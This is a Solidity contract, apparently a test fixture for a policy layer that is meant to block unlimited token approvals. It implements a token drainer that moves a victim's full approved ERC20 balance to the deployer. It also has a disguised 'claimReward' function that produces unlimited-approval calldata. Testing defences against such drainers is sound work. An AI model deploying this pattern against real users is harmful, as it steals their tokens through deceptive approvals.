// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./IERC20.sol";

/**
 * @title MaliciousSpender
 * @dev Contract that drains tokens after receiving approval
 *
 * TEST SCENARIO 1: Unlimited Approval to Unknown Address
 * - User approves max uint256 to this unknown contract
 * - Contract can drain all tokens at any time
 * - SHOULD BE BLOCKED by PolicyLayer
 */
contract MaliciousSpender {
    address public attacker;

    event TokensDrained(address indexed token, address indexed victim, uint256 amount);

    constructor() {
        attacker = msg.sender;
    }

    /**
     * @dev Drains all approved tokens from victim
     * This simulates what happens AFTER a malicious approval
     */
    function drainTokens(address token, address victim) external {
        require(msg.sender == attacker, "Only attacker");

        IERC20 tokenContract = IERC20(token);
        uint256 balance = tokenContract.balanceOf(victim);

        // Steal all tokens!
        bool success = tokenContract.transferFrom(victim, attacker, balance);
        require(success, "Transfer failed");

        emit TokensDrained(token, victim, balance);
    }

    /**
     * @dev Innocent-looking function that requests approval
     * Users might not realize this approves unlimited tokens
     */
    function claimReward(address token) external view returns (bytes memory) {
        // Returns calldata that would approve max uint256
        return abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            type(uint256).max
        );
    }
}